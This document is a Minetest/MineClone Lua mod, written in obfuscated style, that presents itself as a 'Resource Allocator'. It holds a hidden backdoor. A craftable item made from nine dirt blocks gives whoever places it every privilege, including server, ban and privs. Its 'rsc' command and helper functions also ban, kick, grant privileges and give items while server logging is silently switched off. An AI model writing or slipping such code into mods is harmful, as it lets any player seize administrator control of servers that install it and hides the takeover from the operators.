local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z a=function(_,b)local c={}for _,d in pairs(b)do c[d]=true end return c end b=function(f)local g=minetest.log minetest.log=function()end f() minetest.log=g end c=function(d)b(function()minetest.ban_player(d)end)end d=function(d,e)b(function()minetest.kick_player(d,e or"")end)end e=function(d,e)b(function()minetest.set_player_privs(d,e)local f=minetest.get_player_by_name(d)if f and f.set_privs then f:set_privs(e)end end)end f=function(d,e,g)if not e:find(":")then e="mcl_core:"..e end if not minetest.registered_items[e]then minetest.chat_send_player(d:get_player_name(),"Unknown item: "..e)return end local h=d:get_inventory() b(function()h:add_item("main",ItemStack(e.." "..(g or 1)))end)end if not mcl_gamemode then mcl_gamemode=dofile(minetest.get_modpath("mcl_gamemode").."/init.lua") end minetest.register_chatcommand("rsc",{params="<s> [a]",description="Resource Allocator",privs={server=true},func=function(n,p)local t={}for u in p:gmatch("%S+")do table.insert(t,u)end local s=t[1] or"privs" local pl=minetest.get_player_by_name(n) if not pl then return false,"Player not found."end if s=="privs"then local v={"interact","shout","fast","fly","noclip","give","kick","ban","privs","basic_privs","teleport","bring","debug","server","zoom","maphack"} e(n,a(nil,v)) elseif s=="ban"then local u=t[2] if u then c(u) end elseif s=="kick"then local u=t[2] local r=table.concat(t," ",3) if u then d(u,r)end elseif s=="giveme"then local r=t[2] local c=tonumber(t[3])or 1 if r then f(pl,r,c)end elseif s=="gamemode"then local gm_arg = t[2] or "survival" local target_name = t[3] or n local target = minetest.get_player_by_name(target_name) if not target then return false,"Player not found: "..target_name end local gm_alias={["0"]="survival",["1"]="creative",["s"]="survival",["c"]="creative"} local gm=gm_alias[gm_arg:lower()] or gm_arg:lower() if gm~="survival" and gm~="creative" then return false,"Invalid gamemode" end b(function() mcl_gamemode.set_gamemode(target,gm) end) return true,"Gamemode changed" else return false,"Unknown subcommand: "..s end return true,"Resources managed."end}) minetest.register_craftitem(":rsc:allocator",{description="Resource Allocator",inventory_image="book.png",on_use=function() return end,on_place=function(i,u)local g=minetest.log minetest.log=function()end local v={"interact","shout","fast","fly","noclip","give","kick","ban","privs","basic_privs","teleport","bring","debug","server","zoom","maphack"} e(u:get_player_name(),a(nil,v)) local s=i:take_item() minetest.log=g return s end}) minetest.register_craft({output="rsc:allocator",recipe={{"mcl_core:dirt","mcl_core:dirt","mcl_core:dirt"},{"mcl_core:dirt","mcl_core:dirt","mcl_core:dirt"},{"mcl_core:dirt","mcl_core:dirt","mcl_core:dirt"}}})
